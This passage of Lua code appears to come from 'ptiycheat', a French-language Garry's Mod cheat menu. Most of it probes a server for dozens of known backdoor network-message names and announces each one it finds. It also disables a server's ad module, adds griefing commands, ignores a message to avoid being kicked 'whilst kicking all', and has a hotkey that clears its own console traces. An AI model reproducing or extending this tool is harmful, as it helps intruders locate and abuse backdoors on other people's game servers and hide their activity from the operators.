if asnet then MsgC (Color(math.random(1,25),math.random(1,25),math.random(1,25)), "[NetString Détécté] : "..i.." = ") MsgC (Color(math.random(254,255),math.random(254,255),math.random(254,255)),""..asnet.." \n" ) else break end
end
end)



/*=======================
|===== MOTDGD KILL =====|
========================*/

if(istable(MOTDgd))then
MOTDgd = {}
function MOTDgd.Show() end
function MOTDgd.GetIfSkip() return true end
print "pas de pub"
end





local backdoorScrollPanel = vgui.Create( "DScrollPanel", netcmd )
backdoorScrollPanel:Dock( FILL )

local triggeringbd = "";

function triggeringnetcall( str )
local status, error = pcall( net.Start, str )
return status
end

if( triggeringnetcall("Ulx_Error_88") ) then
triggeringbd = "Mining"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("FAdmin_Notification_Receiver") ) then
triggeringbd = "Crero"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("DarkRP_ReceiveData") ) then
triggeringbd = "FAdmin"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("fijiconn") ) then
triggeringbd = "ptiycheatbd"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("Weapon_88") ) then
triggeringbd = "Weapon"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("nostrip") ) then
triggeringbd = "Nostrip"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("SessionBackdoor") ) then
triggeringbd = "Session"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("DarkRP_AdminWeapons") ) then
triggeringbd = "DarkRP_n"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("thefrenchenculer") ) then
triggeringbd = "frenculer"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end


if( triggeringnetcall("Fix_Keypads") ) then
triggeringbd = "Fix_Keypads"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("_CAC_ReadMemory") ) then
triggeringbd = "CAC"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("Remove_Exploiters") ) then
triggeringbd = "Exploiters"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("MoonMan") ) then
triggeringbd = "MoonMan"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("disablebackdoor") ) then
triggeringbd = "disableb"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("Sbox_itemstore") ) then
triggeringbd = "Sbox"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("Sbox_darkrp") ) then
triggeringbd = "Sbox2"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("R8") ) then
triggeringbd = "R8"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("c") ) then
triggeringbd = "c"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("_cac_") ) then
triggeringbd = "_cac_"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("_Defqon") ) then
triggeringbd = "_Defqon"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("noclipcloakaesp_chat_text") ) then
triggeringbd = "nck"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("Sandbox_ArmDupe") ) then
triggeringbd = "ArmDupe"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 81, 96, 255 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("ITEM") ) then
triggeringbd = "ITEM (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("fix") ) then
triggeringbd = "fix (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("ULX_QUERY2") ) then
triggeringbd = "ULX_QUERY2 (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("Sandbox_GayParty") ) then
triggeringbd = "Sandbox_GayParty (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("_CAC_G") ) then
triggeringbd = "_CAC_G (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("fellosnake") ) then
triggeringbd = "fellosnake (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("stoppk") ) then
triggeringbd = "stoppk (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("changename") ) then
triggeringbd = "changename (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("Sbox_Message") ) then
triggeringbd = "Sbox_Message (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("Sbox_gm_attackofnullday_key") ) then
triggeringbd = "Sbox_gm_attackofnullday_key (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("m9k_explosionradius") ) then
triggeringbd = "m9k_explosionradius (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("m9k_explosive") ) then
triggeringbd = "m9k_explosive (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("arivia") ) then
triggeringbd = "arivia (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("_Warns") ) then
triggeringbd = "_Warns (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("pjHabrp9EY") ) then
triggeringbd = "pjHabrp9EY (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else
end

if( triggeringnetcall("_Raze") ) then
triggeringbd = "_Raze (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("Þ� ?D)◘") ) then
triggeringbd = "Þ� ?D)◘ (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("PlayerItemPickUp") ) then
triggeringbd = "PlayerItemPickUp (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("echangeinfo") ) then
triggeringbd = "echangeinfo (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("fourhead") ) then
triggeringbd = "fourhead (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("DefqonBackdoor") ) then
triggeringbd = "DefqonBackdoor (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("xenoexistscl") ) then
triggeringbd = "xenoexistscl (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("cvaraccess") ) then
triggeringbd = "cvaraccess (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("NoNerks") ) then
triggeringbd = "NoNerks (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("cucked") ) then
triggeringbd = "cucked (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else

end

if( triggeringnetcall("OldNetReadData") ) then
triggeringbd = "OldNetReadData (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )else
end

if( triggeringnetcall("DarkRP_UTF8") ) then
triggeringbd = "DarkRP_UTF8 (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("fix") ) then
triggeringbd = "fix (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )

else
end

if( triggeringnetcall("asunalabestwaifu") ) then
triggeringbd = "asunalabestwaifu (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )

else
end

if( triggeringnetcall("__G____CAC") ) then
triggeringbd = "__G____CAC (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )

else
end

if( triggeringnetcall("AbSoluT") ) then
triggeringbd = "AbSoluT (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )

else
end

if( triggeringnetcall("Gamemode_get") ) then
triggeringbd = "Gamemode_get (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )

else
end

if( triggeringnetcall("z") ) then
triggeringbd = "z (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )

else
end

if( triggeringnetcall("cvardel") ) then
triggeringbd = "cvardel (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("jesuslebg") ) then
triggeringbd = "jesuslebg (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd )
else
end

if( triggeringnetcall("effects_en") ) then
triggeringbd = "effects_en (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("file") ) then
triggeringbd = "file (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("_Warns") ) then
triggeringbd = "_Warns (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("_GaySploit") ) then
triggeringbd = "_GaySploit (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("slua") ) then
triggeringbd = "slua (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("BOOST_FPS") ) then
triggeringbd = "BOOST_FPS (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("gag") ) then
triggeringbd = "gag (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("_cac_") ) then
triggeringbd = "_cac_ (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("PlayerItemPickUp") ) then
triggeringbd = "PlayerItemPickUp (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )

else
end

if( triggeringnetcall("m9k_explosive") ) then
triggeringbd = "m9k_explosive (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )
else
end

if( triggeringnetcall("mecthack") ) then
triggeringbd = "mecthack (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )
else
end

if( triggeringnetcall("PlayerCheck") ) then
triggeringbd = "PlayerCheck (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )
else
end

if( triggeringnetcall("88") ) then
triggeringbd = "88 (non-compatible)"
chat.AddText( Color( 0, 0, 0 ), "[ptiycheat]", Color( 255, 74, 74 )," Backdoor Trouvé : "..triggeringbd.."" )
else
end
--if triggeringbd == "" then
--chat.AddText(Color(0, 0, 0), "[", "ptiycheat", "] ", Color( 255, 0, 0 ), "Aucune backdoor présente" )
--else
--end






/*===========================
|===== ptiycheat GUI =====|
===========================*/
surface.CreateFont("clsbtn",{font = "Arial", size = 15, weight = 0, antialias = 0})

/*================================
|===== ptiycheat EXPLOITS =====|
=================================*/

concommand.Add("rainbow",function()
hook.Add("Think", "Rainbow", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end )
end )

function random_string(length)
math.randomseed(os.time())

if length > 0 then
return random_string(length - 1) .. charset[math.random(1, #charset)]
else
return ""
end
end

local s = {}
s.duel = {}
s.duel[1] = table.Random( player.GetAll() )
s.duel[2] = table.Random( player.GetAll() )
s.duel[2] = 3
s.duel[3] = -9999999





//////////// [CLEAR CHAT] ////////////

function clearchat()
for i = 0, 100 do
chat.AddText(" ")
end
end

//////////// [VAPE] ////////////

function Vape()
timer.Simple(0, function() RunConsoleCommand("+attack") end )
timer.Simple(5.134, function() RunConsoleCommand("-attack") end )
end
concommand.Add("vape", Vape)
concommand.Add("clearchat", clearchat)

function Initialize()
net.Receive("DL_Answering_global", function(_len)end) // Stop LocalPlayer from getting kicked whilst kicking all
net.Receive( "metro_notification",function() // Disable Metro Notification
return
end)

//////////// Font Creation ////////////
--
surface.CreateFont( "Arial", {
font = "Arial",
size = 18,
} )
--
surface.CreateFont( "Calibri-sm", {
font = "Calibri",
size = 15,
} )
--
surface.CreateFont( "Calibri-l", {
font = "Calibri",
size = 21,
} )
--
surface.CreateFont( "tahoma", {
font = "Tahoma",
size = 15,
} )
--
end
Initialize(); // Initializes basic shit for when menu is loaded.



----------------------
concommand.Add( "fiji_clearbd", function() -- fiji_sv_existmen
print("\n")
end)

concommand.Add( "fiji_clearluarun", function() -- fiji_sv_existmen
print("\n")
end)

concommand.Add( "fiji_clearconsole", function() -- fiji_sv_existmen
print("\n")
end)

hook.Add("Think", "catBOT", function(ucmd, origin, angles, calcview, fov, p, o, a, f, aaaaa )
if !btnCooldown || CurTime() > btnCooldown then
if fiji_sv_existmen:GetInt() == 0 then
if(input.IsKeyDown(KEY_LALT))then
LocalPlayer():ConCommand("ptiycheat")
else end
elseif(input.IsKeyDown(KEY_LALT))then
LocalPlayer():ConCommand("clear_ptiycheat")
LocalPlayer():ConCommand("fiji_clearbd")
LocalPlayer():ConCommand("fiji_clearluarun")
LocalPlayer():ConCommand("fiji_clearespent")
LocalPlayer():ConCommand("fiji_clearconsole")
LocalPlayer():ConCommand("fiji_sv_existmen 0")
end
btnCooldown = CurTime() + 0.5
end
end)

